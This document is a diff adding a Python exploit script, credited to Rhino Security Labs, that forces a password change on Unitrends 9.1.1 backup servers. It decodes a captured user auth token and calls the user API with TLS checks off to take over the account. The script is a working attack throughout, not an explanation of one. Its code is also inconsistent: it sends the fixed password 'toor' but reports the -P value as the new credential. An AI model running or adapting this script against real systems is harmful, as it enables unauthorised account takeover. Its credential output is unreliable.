@@ -1,0 +1,47 @@
+#!/usr/bin/python
+import requests
+import optparse
+import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from urllib import base64, unquote
+
+def main():
+    parser = optparse.OptionParser("%prog -u https://url_to_unitrends_server.com -a auth_string [-P password]")
+    parser.add_option("-U", dest="username", type="string", help="Username with root privledges to login to Admin interface.")
+    parser.add_option("-u", dest="url", type="string", help="URL or IP of Unitrends server.")
+    parser.add_option("-P", dest="password", type="string", default="unitrends1", help="Password to set. Default is unitrends1.")
+    parser.add_option("-a", dest="auth_string", type="string", help="Authentication string of a logged in user.")
+    (options, args) = parser.parse_args()
+    print "[+] Unitrends 9.1.1 Force Password Change"
+    print "[+] Created by Dwight H. from Rhino Security Labs"
+    if not options.url or not options.auth_string:
+        print "[-] Not enough arguments given."
+        return
+    s = requests.Session()
+    url = options.url
+    password = options.password
+    if url[-1] == "/":
+        url = url[:-1]
+    # Make sure we're not url encoded. Also if copy pasted from 'token' cookie it is quotes surrounding the base64, so replace those.
+    auth_string = unquote(options.auth_string).replace('"', "")
+    decoded = base64.decodestring(auth_string)
+    # print auth_string
+    # print decoded
+    uid = decoded.split(":")[2]
+    uname = decoded.split(":")[3].split("/")[-1].replace(".log","").replace("gui_","")
+    headers = {"AuthToken": auth_string}
+    data = {
+        "password": 'toor',
+        "force": True,
+    }
+    r = s.put(url + "/api/users/{}/?sid=undefined".format(uid), headers=headers, data=json.dumps(data), verify=False)
+    print r.content
+    print r.status_code
+    print r.reason
+    if '"code":"0"' in r.content:
+        print "[+] Login credentials are now {}:{}".format(uname, password)
+    else:
+        print "Password change failed."
+        print r.content
+if __name__== "__main__":
+    main()
